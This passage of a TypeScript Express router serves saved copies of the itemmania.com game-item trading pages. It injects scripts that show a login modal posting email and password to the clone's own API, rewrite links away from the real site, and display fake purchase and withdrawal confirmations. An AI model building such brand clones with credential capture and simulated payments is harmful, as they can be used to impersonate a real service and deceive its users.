              setTimeout(function() { location.href = '/login'; }, 1200); return;
            }
            var amtEl = form.querySelector('[name=pay_amount],[name=amount],[name=withdraw_amount]');
            var amt = amtEl ? amtEl.value.trim() : '';
            if (!amt || isNaN(Number(amt.replace(/,/g,'')))) {
              showToast('출금 금액을 입력해주세요.', false); return;
            }
            showToast('휴대폰 출금 신청이 완료되었습니다!', true);
            setTimeout(function() { location.href = '/myroom/index.html'; }, 1800);
          })
          .catch(function() { showToast('오류가 발생했습니다.', false); });
      });
    }

    // ── 마이룸으로 돌아가기 ────────────────────────────────────────────
    document.querySelectorAll('a[href*="/myroom/"]').forEach(function(a) {
      var h = a.getAttribute('href') || '';
      if (h.match(/\/myroom\/?$/) || h.endsWith('/myroom/')) {
        a.href = '/myroom/index.html';
        a.addEventListener('click', function(e) { e.preventDefault(); location.href = '/myroom/index.html'; });
      }
    });

    // ── 홈 링크 ──────────────────────────────────────────────────────
    document.querySelectorAll('a[href="/"],a[href="https://www.itemmania.com/"]')
      .forEach(function(a) { a.href = '/'; });
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
  else init();
})();
</script>
`;

const CHAT_NEW_INTERCEPT_SCRIPT = `
<script>
(function() {
  function api(method, path, body) {
    return fetch('/api' + path, {
      method: method, credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: body ? JSON.stringify(body) : undefined
    }).then(function(r){ return r.json(); }).catch(function(){ return {}; });
  }

  function init() {
    var params = new URLSearchParams(location.search);
    var type = params.get('type') || 'sell'; // sell | buy

    // ── 인수확인 버튼 텍스트 분기 ──────────────────────────────────
    var tradeIngBtn = document.getElementById('trade_ing');
    if (tradeIngBtn) {
      tradeIngBtn.textContent = (type === 'buy') ? '인수확인' : '인수확인요청';
    }

    // ── 인수확인(요청) 클릭 → buy_check_layer 표시 ─────────────────
    if (tradeIngBtn) {
      tradeIngBtn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        var layer = document.getElementById('buy_check_layer');
        if (layer) {
          layer.style.display = 'block';
          layer.classList.remove('sf-hidden');
        }
      }, true);
    }

    // ── buy_check_layer 버튼들 ──────────────────────────────────────
    var cancelBtn = document.getElementById('cancel_btn');
    if (cancelBtn) {
      cancelBtn.addEventListener('click', function(e) {
        e.preventDefault();
        var layer = document.getElementById('buy_check_layer');
        if (layer) layer.style.display = 'none';
      });
    }

    var tradeEndBtn = document.getElementById('trade_end_btn');
    if (tradeEndBtn) {
      tradeEndBtn.addEventListener('click', function(e) {
        e.preventDefault();
        var layer = document.getElementById('buy_check_layer');
        if (layer) layer.style.display = 'none';
        var stateEl = document.getElementById('trade_state_text');
        if (stateEl) stateEl.textContent = '거래완료';
        var noticeEl = document.getElementById('chat_notice_txt');
        if (noticeEl) { noticeEl.innerHTML = '<b>거래가 완료되었습니다.</b><br><span class=sub_txt>아이템매니아를 이용해 주셔서 감사합니다.</span>'; }
        if (tradeIngBtn) { tradeIngBtn.disabled = true; tradeIngBtn.style.opacity = '0.4'; }
      });
    }

    // ── 거래취소 ────────────────────────────────────────────────────
    var cancelTrade = document.getElementById('trade_cancel');
    if (cancelTrade) {
      cancelTrade.addEventListener('click', function(e) {
        e.preventDefault();
        if (confirm('거래를 취소하시겠습니까?')) {
          var stateEl = document.getElementById('trade_state_text');
          if (stateEl) stateEl.textContent = '거래취소';
          if (tradeIngBtn) { tradeIngBtn.disabled = true; tradeIngBtn.style.opacity='0.4'; }
          if (cancelTrade) { cancelTrade.disabled = true; cancelTrade.style.opacity='0.4'; }
        }
      });
    }

    // ── 채팅종료 ────────────────────────────────────────────────────
    var exitBtn = document.getElementById('chat_exit');
    if (exitBtn) {
      exitBtn.addEventListener('click', function(e) {
        e.preventDefault();
        if (confirm('채팅을 종료하시겠습니까?')) { window.close(); }
      });
    }

    // ── 채팅차단 / 신고하기 / 자주쓰는채팅 / 알림보내기 ───────────
    ['chat_block','user_report','chat_template','chat_alarm','chat_print','send_file'].forEach(function(id) {
      var el = document.getElementById(id);
      if (el) el.addEventListener('click', function(e) {
        e.preventDefault(); alert('해당 기능은 준비 중입니다.');
      });
    });

    // ── 메시지 전송 ─────────────────────────────────────────────────
    var sendBtn = document.getElementById('send_btn');
    var textarea = document.getElementById('write_chat');
    if (sendBtn && textarea) {
      function sendMsg() {
        var msg = textarea.value.trim();
        if (!msg) return;
        var list = document.getElementById('chat_content_list');
        if (list) {
          var now = new Date();
          var hhmm = now.getHours().toString().padStart(2,'0') + ':' + now.getMinutes().toString().padStart(2,'0');
          var div = document.createElement('div');
          div.className = 'chat_item me';
          div.innerHTML = '<div class=chat_msg><span>' + msg.replace(/</g,'&lt;') + '</span></div><div class=send_time>' + hhmm + '</div>';
          list.appendChild(div);
          list.scrollTop = list.scrollHeight;
        }
        textarea.value = '';
      }
      sendBtn.addEventListener('click', sendMsg);
      textarea.addEventListener('keydown', function(e) {
        if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendMsg(); }
      });
    }

    // ── 뒤로가기 링크 ───────────────────────────────────────────────
    var backBtn = document.querySelector('a.back_btn');
    if (backBtn) {
      backBtn.href = '/myroom/chat/list.html';
      backBtn.addEventListener('click', function(e) {
        e.preventDefault(); location.href = '/myroom/chat/list.html';
      });
    }

    // ── 로그인 상태 반영 ────────────────────────────────────────────
    api('GET', '/auth/me').then(function(data) {
      if (data && data.id) {
        var uidEl = document.querySelector('.chat_user .uid');
        // 내 채팅은 "me" 스타일 유지 — 별도 처리 없이 OK
      }
    });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else { init(); }
})();
</script>
`;

const CHAT_INTERCEPT_SCRIPT = `
<script>
(function() {
  // 로그인 상태 확인
  function isLoggedIn() {
    return fetch('/api/auth/me', { credentials: 'include' })
      .then(function(r) { return r.ok ? r.json() : null; })
      .then(function(d) { return d && d.id; })
      .catch(function() { return false; });
  }

  function initButtons() {
    // 마이룸 버튼 → 메인으로
    var myroomBtn = document.querySelector('button.go_myroom');
    if (myroomBtn) {
      myroomBtn.addEventListener('click', function(e) {
        e.preventDefault();
        window.close();
      });
    }

    // 차단리스트
    var blockBtn = document.querySelector('button.block_list');
    if (blockBtn) {
      blockBtn.addEventListener('click', function(e) {
        e.preventDefault();
        alert('차단리스트 기능은 준비 중입니다.');
      });
    }

    // 채팅종료 버튼
    document.body.addEventListener('click', function(e) {
      var btn = e.target.closest && e.target.closest('button.chat_exit');
      if (btn) {
        e.preventDefault(); e.stopPropagation();
        if (confirm('채팅을 종료하시겠습니까?')) {
          var li = btn.closest('li.chat_list_item');
          if (li) {
            li.style.opacity = '0.4';
            var stateEl = li.querySelector('.trade_state');
            if (stateEl) { stateEl.textContent = '거래종료'; stateEl.className = 'trade_state end'; }
          }
        }
      }
    });

    // 그룹보기 (expand/collapse)
    document.body.addEventListener('click', function(e) {
      var btn = e.target.closest && e.target.closest('button.chat_group_expand');
      if (btn) {
        e.preventDefault(); e.stopPropagation();
        var li = btn.closest('li.chat_list_item');
        if (li) {
          li.classList.toggle('expand');
          var subList = li.querySelector('.chat_sub_list');
          if (subList) {
            if (li.classList.contains('expand')) {
              subList.style.height = 'auto';
              btn.textContent = '그룹닫기';
            } else {
              subList.style.height = '0';
              btn.textContent = '그룹보기';
            }
          }
        }
      }
    });

    // 채팅 목록 아이템 클릭 → 채팅방 오픈
    document.body.addEventListener('click', function(e) {
      // 버튼 클릭은 위의 �핸들러가 처리하므로 제외
      if (e.target.closest('button')) return;
      var li = e.target.closest && e.target.closest('li[data-expand], li[data-no]');
      if (!li) return;
      e.preventDefault(); e.stopPropagation();
      var tid = li.getAttribute('data-expand') || li.getAttribute('data-no') || '';
      var channel = li.getAttribute('data-channels') || '';
      // 거래 타입 추론: .trade_type 클래스에서
      var typeEl = li.querySelector('.trade_type');
      var tradeType = 'sell';
      if (typeEl) {
        var cls = typeEl.className || '';
        if (cls.includes('buy')) tradeType = 'buy';
      }
      if (tid) {
        var url = '/myroom/chat/new_chat.html?tid=' + tid + '&type=' + tradeType;
        if (channel) url += '&channel_no=' + channel;
        window.open(url, '_chat_' + tid, 'width=900,height=700,resizable=yes,scrollbars=yes');
      }
    }, true);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initButtons);
  } else {
    initButtons();
  }
})();
</script>
`;

const SELL_APPLICATION_INTERCEPT_SCRIPT = `
<script>
(function() {
  function api(method, path, body) {
    return fetch('/api' + path, {
      method: method,
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: body ? JSON.stringify(body) : undefined
    }).then(function(r){ return r.json(); }).catch(function(){ return {}; });
  }

  function showLoginModal() {
    var existing = document.getElementById('_im_overlay');
    if (existing) { existing.style.display = 'flex'; return; }
    var div = document.createElement('div');
    div.innerHTML = '<div id="_im_overlay" style="display:flex;position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.55);align-items:center;justify-content:center"><div style="background:#fff;border-radius:14px;padding:36px 32px 28px;width:400px;max-width:92vw;box-shadow:0 24px 64px rgba(0,0,0,.22);font-family:Pretendard,-apple-system,sans-serif"><div style="text-align:right;margin-bottom:8px"><button id="_im_close" style="background:none;border:none;font-size:22px;cursor:pointer;color:#888">&times;</button></div><h2 style="margin:0 0 8px;font-size:22px;font-weight:700">로그인이 필요합니다</h2><p style="color:#555;margin:0 0 24px;font-size:14px">구매하시려면 먼저 로그인해주세요.</p><input type="email" id="_im_e" placeholder="이메일" style="display:block;width:100%;box-sizing:border-box;padding:12px 14px;margin-bottom:10px;border:1.5px solid #ddd;border-radius:8px;font-size:15px;outline:none"><input type="password" id="_im_p" placeholder="비밀번호" style="display:block;width:100%;box-sizing:border-box;padding:12px 14px;margin-bottom:10px;border:1.5px solid #ddd;border-radius:8px;font-size:15px;outline:none"><button id="_im_login_btn" style="width:100%;padding:14px;background:#159EFD;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer">로그인하기</button><div id="_im_err" style="margin-top:10px;min-height:18px;font-size:13px;color:#e03030;text-align:center"></div></div></div>';
    document.body.appendChild(div.firstChild);
    document.getElementById('_im_close').onclick = function(){ document.getElementById('_im_overlay').style.display='none'; };
    document.getElementById('_im_login_btn').onclick = function(){
      var email = document.getElementById('_im_e').value;
      var pw = document.getElementById('_im_p').value;
      var errEl = document.getElementById('_im_err');
      if (!email || !pw) { errEl.textContent = '이메일과 비밀번호를 입력해주세요.'; return; }
      api('POST', '/auth/login', { email: email, password: pw }).then(function(data){
        if (data && data.id) {
          document.getElementById('_im_overlay').style.display = 'none';
          showPurchaseSuccess();
        } else {
          errEl.textContent = (data && data.error) || '로그인에 실패했습니다.';
        }
      });
    };
    setTimeout(function(){ var el = document.getElementById('_im_e'); if(el) el.focus(); }, 50);
  }

  function showPurchaseSuccess() {
    alert('구매 신청이 완료되었습니다.\\n판매자와 채팅으로 거래를 진행해 주세요.');
  }

  function init() {
    // 구매신청 버튼 — form 제출 인터셉트
    var form = document.getElementById('frmSell');
    if (form) {
      form.addEventListener('submit', function(e) {
        e.preventDefault();
        api('GET', '/auth/me').then(function(data){
          if (data && data.id) { showPurchaseSuccess(); }
          else { showLoginModal(); }
        });
      });
    }
    // 구매신청 버튼 (button[type=button] 이름 없는 마지막 버튼)
    document.querySelectorAll('button[type=button]').forEach(function(btn) {
      if (btn.textContent.trim() === '구매신청') {
        btn.addEventListener('click', function(e) {
          e.preventDefault(); e.stopImmediatePropagation();
          api('GET', '/auth/me').then(function(data){
            if (data && data.id) { showPurchaseSuccess(); }
            else { showLoginModal(); }
          });
        }, true);
      }
    });

    // 채팅 버튼 → 채팅 창
    document.querySelectorAll('button.go_chat, button[name=go_chat]').forEach(function(btn) {
      btn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        window.open('/myroom/chat/list.html', '_blank', 'width=900,height=700,resizable=yes,scrollbars=yes');
      }, true);
    });

    // 충전하기 버튼 → 준비 중
    document.querySelectorAll('button.charge_btn').forEach(function(btn) {
      btn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        alert('충전 서비스는 게임 할인충전 페이지를 이용해주세요.');
      }, true);
    });

    // 쿠폰, 찜하기 버튼 → 준비 중
    document.querySelectorAll('#coupon_btn, .btn_fav').forEach(function(btn) {
      btn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        alert('해당 기능은 현재 준비 중입니다.');
      }, true);
    });

    // 헤더 로그인 버튼
    var loginBtn = document.querySelector('.header-logins button');
    if (loginBtn) {
      loginBtn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        location.href = '/login';
      }, true);
    }

    // 채팅 버튼 (헤더)
    var chatBtn = document.querySelector('#chat_notice button');
    if (chatBtn) {
      chatBtn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        window.open('/myroom/chat/list.html', '_blank', 'width=900,height=700,resizable=yes,scrollbars=yes');
      }, true);
    }

    // 차단 마커 링크
    document.body.addEventListener('click', function(e) {
      var a = e.target.closest && e.target.closest('a[data-blocked]');
      if (a) { e.preventDefault(); alert('해당 기능은 현재 준비 중입니다.'); }
    });

    // 로그인 상태에 따라 헤더 업데이트
    api('GET', '/auth/me').then(function(data){
      if (data && data.id) {
        var loginsDiv = document.querySelector('.header-logins');
        if (loginsDiv) {
          loginsDiv.innerHTML =
            '<span style="font-size:14px;font-weight:600;color:#2e2e2e">' + (data.nickname || data.email) + '님</span>' +
            '<div class="divider"></div>' +
            '<button type="button" id="_im_logout_btn" style="font-size:14px;font-weight:600;background:none;border:none;cursor:pointer;color:#159EFD">로그아웃</button>';
          document.getElementById('_im_logout_btn').addEventListener('click', function(){
            api('POST', '/auth/logout').then(function(){ location.reload(); });
          });
        }
      }
    });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
</script>
`;

const BUY_INTERCEPT_SCRIPT = `
<script>
(function() {
  function api(method, path, body) {
    return fetch('/api' + path, {
      method: method,
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: body ? JSON.stringify(body) : undefined
    }).then(function(r){ return r.json(); }).catch(function(){ return {}; });
  }

  function init() {
    // 팝니다 탭 → 판매 목록으로 이동 (search_game 유지)
    document.querySelectorAll('button[data-type="sell"]').forEach(function(btn) {
      btn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        var params = new URLSearchParams(location.search);
        var game = params.get('search_game') || '5913';
        location.href = '/sell/list.html?search_game=' + game;
      }, true);
    });

    // 채팅 버튼 (헤더) → 별도 창
    var chatBtn = document.querySelector('#chat_notice button');
    if (chatBtn) {
      chatBtn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        window.open('/myroom/chat/list.html', '_blank', 'width=900,height=700,resizable=yes,scrollbars=yes');
      }, true);
    }

    // 헤더 로그인/로그아웃
    var loginBtn = document.querySelector('.header-logins button');
    if (loginBtn) {
      loginBtn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        location.href = '/login';
      }, true);
    }

    // 삽니다 상품 리스트 아이템 클릭 → 상세 페이지 이동
    document.body.addEventListener('click', function(e) {
      var li = e.target.closest && e.target.closest('li.list_item[data-tid]');
      if (li) {
        var tid = li.getAttribute('data-tid');
        if (tid) {
          e.preventDefault(); e.stopPropagation();
          location.href = '/buy/application.html?id=' + tid;
        }
      }
    }, true);

    // 로그인 상태 반영
    api('GET', '/auth/me').then(function(data){
      if (data && data.id) {
        var loginsDiv = document.querySelector('.header-logins');
        if (loginsDiv) {
          loginsDiv.innerHTML =
            '<span style="font-size:14px;font-weight:600;color:#2e2e2e">' + (data.nickname || data.email) + '님</span>' +
            '<div class="divider"></div>' +
            '<button type="button" id="_im_logout_btn" style="font-size:14px;font-weight:600;background:none;border:none;cursor:pointer;color:#159EFD">로그아웃</button>';
          document.getElementById('_im_logout_btn').addEventListener('click', function(){
            api('POST', '/auth/logout').then(function(){ location.reload(); });
          });
        }
      }
    });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
</script>
`;

const BUY_APPLICATION_INTERCEPT_SCRIPT = `
<script>
(function() {
  function api(method, path, body) {
    return fetch('/api' + path, {
      method: method,
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: body ? JSON.stringify(body) : undefined
    }).then(function(r){ return r.json(); }).catch(function(){ return {}; });
  }

  function showLoginModal() {
    var overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:9999;display:flex;align-items:center;justify-content:center';
    overlay.innerHTML = '<div style="background:#fff;border-radius:12px;padding:36px 32px;max-width:380px;width:90%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.18)">' +
      '<div style="font-size:22px;font-weight:700;margin-bottom:8px;color:#2e2e2e">로그인이 필요합니다</div>' +
      '<div style="font-size:14px;color:#767676;margin-bottom:24px">판매신청/채팅을 이용하려면 로그인해 주세요.</div>' +
      '<div style="display:flex;gap:10px;justify-content:center">' +
        '<button id="_im_modal_cancel" style="flex:1;padding:12px 0;border:1px solid #ddd;border-radius:8px;background:#fff;font-size:15px;font-weight:600;cursor:pointer;color:#555">취소</button>' +
        '<button id="_im_modal_login" style="flex:1;padding:12px 0;border:none;border-radius:8px;background:#159EFD;color:#fff;font-size:15px;font-weight:700;cursor:pointer">로그인</button>' +
      '</div>' +
    '</div>';
    document.body.appendChild(overlay);
    document.getElementById('_im_modal_cancel').onclick = function(){ document.body.removeChild(overlay); };
    document.getElementById('_im_modal_login').onclick = function(){ location.href = '/login'; };
    overlay.addEventListener('click', function(e){ if(e.target === overlay) document.body.removeChild(overlay); });
  }

  function showSuccessModal(msg) {
    var overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:9999;display:flex;align-items:center;justify-content:center';
    overlay.innerHTML = '<div style="background:#fff;border-radius:12px;padding:36px 32px;max-width:380px;width:90%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.18)">' +
      '<div style="font-size:40px;margin-bottom:12px">✅</div>' +
      '<div style="font-size:20px;font-weight:700;margin-bottom:8px;color:#2e2e2e">' + msg + '</div>' +
      '<div style="font-size:14px;color:#767676;margin-bottom:24px">채팅창에서 판매자와 거래를 진행해 주세요.</div>' +
      '<button id="_im_modal_ok" style="padding:12px 40px;border:none;border-radius:8px;background:#159EFD;color:#fff;font-size:15px;font-weight:700;cursor:pointer">확인</button>' +
    '</div>';
    document.body.appendChild(overlay);
    document.getElementById('_im_modal_ok').onclick = function(){ document.body.removeChild(overlay); };
  }

  var _loggedIn = null;
  function checkLogin() {
    if (_loggedIn !== null) return Promise.resolve(_loggedIn);
    return api('GET', '/auth/me').then(function(d){ _loggedIn = !!(d && d.id); return _loggedIn; });
  }

  function init() {
    // 판매신청 버튼 (btn_green)
    document.querySelectorAll('button.btn_green').forEach(function(btn) {
      btn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        checkLogin().then(function(ok) {
          if (!ok) { showLoginModal(); return; }
          showSuccessModal('판매신청이 완료되었습니다');
        });
      }, true);
    });

    // form submit 차단 (frmSell)
    var form = document.getElementById('frmSell');
    if (form) {
      form.addEventListener('submit', function(e){ e.preventDefault(); e.stopImmediatePropagation(); }, true);
    }

    // 채팅 버튼 (.go_chat)
    document.querySelectorAll('button.go_chat, button[name=go_chat]').forEach(function(btn) {
      btn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        checkLogin().then(function(ok) {
          if (!ok) { showLoginModal(); return; }
          window.open('/myroom/chat/list.html', '_blank', 'width=900,height=700,resizable=yes,scrollbars=yes');
        });
      }, true);
    });

    // 찜하기 버튼
    document.querySelectorAll('button.btn_fav, button.btn_fav2').forEach(function(btn) {
      btn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        checkLogin().then(function(ok) {
          if (!ok) { showLoginModal(); return; }
          btn.textContent = '찜완료 ♥';
          btn.style.color = '#ff4d4d';
        });
      }, true);
    });

    // 헤더 채팅 버튼
    var chatBtn = document.querySelector('#chat_notice button');
    if (chatBtn) {
      chatBtn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        window.open('/myroom/chat/list.html', '_blank', 'width=900,height=700,resizable=yes,scrollbars=yes');
      }, true);
    }

    // 로그인 상태 반영
    api('GET', '/auth/me').then(function(data){
      _loggedIn = !!(data && data.id);
      if (data && data.id) {
        var loginsDiv = document.querySelector('.header-logins');
        if (loginsDiv) {
          loginsDiv.innerHTML =
            '<span style="font-size:14px;font-weight:600;color:#2e2e2e">' + (data.nickname || data.email) + '님</span>' +
            '<div class="divider"></div>' +
            '<button type="button" id="_im_logout_btn" style="font-size:14px;font-weight:600;background:none;border:none;cursor:pointer;color:#159EFD">로그아웃</button>';
          document.getElementById('_im_logout_btn').addEventListener('click', function(){
            api('POST', '/auth/logout').then(function(){ location.reload(); });
          });
        }
      }
    });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
</script>
`;

function serveBuyApplication(html: string): string {
  const result = prepare(html);
  return result.includes("</body>")
    ? result.replace("</body>", BUY_APPLICATION_INTERCEPT_SCRIPT + "</body>")
    : result + BUY_APPLICATION_INTERCEPT_SCRIPT;
}

function serveBuy(html: string): string {
  const result = prepare(html);
  return result.includes("</body>")
    ? result.replace("</body>", BUY_INTERCEPT_SCRIPT + "</body>")
    : result + BUY_INTERCEPT_SCRIPT;
}

function serveApplication(html: string): string {
  const result = prepare(html);
  if (result.includes("</body>")) {
    return result.replace("</body>", SELL_APPLICATION_INTERCEPT_SCRIPT + "</body>");
  }
  return result + SELL_APPLICATION_INTERCEPT_SCRIPT;
}

function serveChat(html: string): string {
  const result = prepare(html);
  if (result.includes("</body>")) {
    return result.replace("</body>", CHAT_INTERCEPT_SCRIPT + "</body>");
  }
  return result + CHAT_INTERCEPT_SCRIPT;
}

function extractBuyCheckLayer(src: string): string | null {
  const start = src.indexOf('id=buy_check_layer');
  if (start < 0) return null;
  const divStart = src.lastIndexOf('<div', start);
  if (divStart < 0) return null;
  let depth = 0, i = divStart;
  while (i < src.length) {
    if (src.slice(i, i + 4) === '<div') depth++;
    else if (src.slice(i, i + 6) === '</div>') { depth--; if (depth === 0) return src.slice(divStart, i + 6); }
    i++;
  }
  return null;
}

function serveSellRegister(html: string): string {
  const result = prepare(html);
  return result.includes("</body>")
    ? result.replace("</body>", SELL_REGISTER_INTERCEPT_SCRIPT + "</body>")
    : result + SELL_REGISTER_INTERCEPT_SCRIPT;
}

function serveBuyRegister(html: string): string {
  const result = prepare(html);
  return result.includes("</body>")
    ? result.replace("</body>", BUY_REGISTER_INTERCEPT_SCRIPT + "</body>")
    : result + BUY_REGISTER_INTERCEPT_SCRIPT;
}

function serveSellNew(html: string): string {
  const result = prepare(html);
  return result.includes("</body>")
    ? result.replace("</body>", SELL_NEW_INTERCEPT_SCRIPT + "</body>")
    : result + SELL_NEW_INTERCEPT_SCRIPT;
}

function serveBuyNew(html: string): string {
  const result = prepare(html);
  return result.includes("</body>")
    ? result.replace("</body>", BUY_NEW_INTERCEPT_SCRIPT + "</body>")
    : result + BUY_NEW_INTERCEPT_SCRIPT;
}

function serveBatchGoods(html: string): string {
  const result = prepare(html);
  return result.includes("</body>")
    ? result.replace("</body>", BATCH_GOODS_INTERCEPT_SCRIPT + "</body>")
    : result + BATCH_GOODS_INTERCEPT_SCRIPT;
}

function serveMyroom(html: string): string {
  const result = prepare(html);
  return result.includes("</body>")
    ? result.replace("</body>", MYROOM_INTERCEPT_SCRIPT + "</body>")
    : result + MYROOM_INTERCEPT_SCRIPT;
}

function servePaymentList(html: string): string {
  const result = prepare(html);
  return result.includes("</body>")
    ? result.replace("</body>", PAYMENT_LIST_INTERCEPT_SCRIPT + "</body>")
    : result + PAYMENT_LIST_INTERCEPT_SCRIPT;
}

function servePaymentPhoneList(html: string): string {
  const result = prepare(html);
  return result.includes("</body>")
    ? result.replace("</body>", PAYMENT_PHONE_LIST_INTERCEPT_SCRIPT + "</body>")
    : result + PAYMENT_PHONE_LIST_INTERCEPT_SCRIPT;
}

function serveChatNew(html: string): string {
  let result = prepare(html);

  // buy_check_layer: 빈 레이어를 buycheck 파일의 전체 레이어로 교체
  if (chatNewBuycheckHtml) {
    const fullLayer = extractBuyCheckLayer(chatNewBuycheckHtml);
    if (fullLayer) {
      // hidden 스타일로 교체 (JS로 display:block 토글)
      const hiddenLayer = fullLayer
        .replace('style=display:block', 'style="display:none"')
        .replace(/class="g_layer buy_check_layer"/, 'class="g_layer buy_check_layer" style="display:none"');
      result = result.replace(
        /<div[^>]+class="g_layer buy_check_layer[^"]*"[^>]*id=buy_check_layer[^>]*>[\s\S]*?<\/div>/,
        hiddenLayer
      );
    }
  }

  return result.includes("</body>")
    ? result.replace("</body>", CHAT_NEW_INTERCEPT_SCRIPT + "</body>")
    : result + CHAT_NEW_INTERCEPT_SCRIPT;
}

// 루트 접속 → 아이템마니아 메인으로 리다이렉트
router.get(["/", ""], (_req, res): void => {
  if (!staticHtml) {
    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
    return;
  }
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-cache");
  res.send(serveItemmania(staticHtml));
});

// React 앱 경로 → 아이템마니아 클론으로 리다이렉트
router.get(["/app", "/app/{*path}"], (_req, res): void => {
  res.redirect(301, "/");
});

// 원본 itemmania 경로로 JS가 상대경로 이동할 때 → 프록시 경로로 리다이렉트
router.get(["/game_charge", "/game_charge/"], (_req, res): void => {
  res.redirect(302, "/game-charge");
});
router.get(["/portal/giftcard", "/portal/giftcard/"], (_req, res): void => {
  res.redirect(302, "/giftcard");
});
router.get("/portal/user/p_login_form.html", (_req, res): void => {
  res.redirect(302, "/portal/user/p_login_form.html");
});
router.get(["/myroom", "/myroom/"], (_req, res): void => {
  res.redirect(302, "/myroom/index.html");
});
router.get(["/myroom/chat/list.html", "/myroom/chat/"], (_req, res): void => {
  res.redirect(302, "/myroom/chat/list.html");
});
router.get("/sell/application.html", (req, res): void => {
  const id = req.query["id"] ? `?id=${req.query["id"]}` : "";
  res.redirect(302, `/sell/application.html${id}`);
});

// 로그인 페이지 라우트 (itemmania 원본 경로 + 단축 경로)
router.get(
  ["/portal/user/p_login_form.html", "/login"],
  (req, res): void => {
    if (!loginHtml) {
      res.status(503).send("<html><body><h2>로그인 페이지를 불러올 수 없습니다</h2></body></html>");
      return;
    }
    res.set("Content-Type", "text/html; charset=utf-8");
    res.set("Cache-Control", "no-cache");
    res.send(serveLogin(loginHtml));
  }
);

// 상품권몰 페이지
router.get(["/giftcard", "/portal/giftcard", "/portal/giftcard/"], (req, res): void => {
  if (!giftcardHtml) {
    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
    return;
  }
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-cache");
  res.send(serveGiftcard(giftcardHtml));
});

// 게임 할인충전 페이지
router.get(["/game-charge", "/game_charge", "/game_charge/"], (req, res): void => {
  if (!gamechargeHtml) {
    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
    return;
  }
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-cache");
  res.send(serveGameCharge(gamechargeHtml));
});

// 게임별 상품 목록 페이지 — search_game 쿼리로 분기 (TOP 10 전체)
router.get(
  ["/sell/list.html", "/sell/lineage-classic", "/sell/maplestory-world"],
  (req, res): void => {
    const game = String(req.query["search_game"] ?? "");

    // 게임 ID → HTML 선택
    let html: string;
    if (game === "5913") {
      html = sellLineageClassicHtml;
    } else if (game === "5233") {
      html = sellMaplestoryWorldHtml;
    } else if (SELL_HTML_MAP[game]) {
      html = SELL_HTML_MAP[game];
    } else {
      // search_game 없거나 알 수 없는 경우 → 리니지클래식을 기본
      html = sellLineageClassicHtml;
    }

    if (!html) {
      res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
      return;
    }
    res.set("Content-Type", "text/html; charset=utf-8");
    res.set("Cache-Control", "no-cache");
    res.send(serveLineageClassic(html));
  }
);

// 원본 경로 리다이렉트 — search_game 그대로 전달
router.get("/sell/list.html", (req, res): void => {
  const game = req.query["search_game"];
  if (game) {
    res.redirect(302, `/sell/list.html?search_game=${game}`);
  } else {
    res.redirect(302, "/");
  }
});

// 판매등록 페이지
router.get(["/sell/register.html", "/sell/", "/sell"], (req, res): void => {
  if (!sellRegisterHtml) {
    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
    return;
  }
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-cache");
  res.send(serveSellRegister(sellRegisterHtml));
});

// 구매등록 페이지
router.get("/buy/register.html", (req, res): void => {
  if (!buyRegisterHtml) {
    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
    return;
  }
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-cache");
  res.send(serveBuyRegister(buyRegisterHtml));
});

// 판매 NEW 모드 페이지
router.get("/sell/new.html", (_req, res): void => {
  if (!sellNewHtml) {
    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
    return;
  }
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-cache");
  res.send(serveSellNew(sellNewHtml));
});

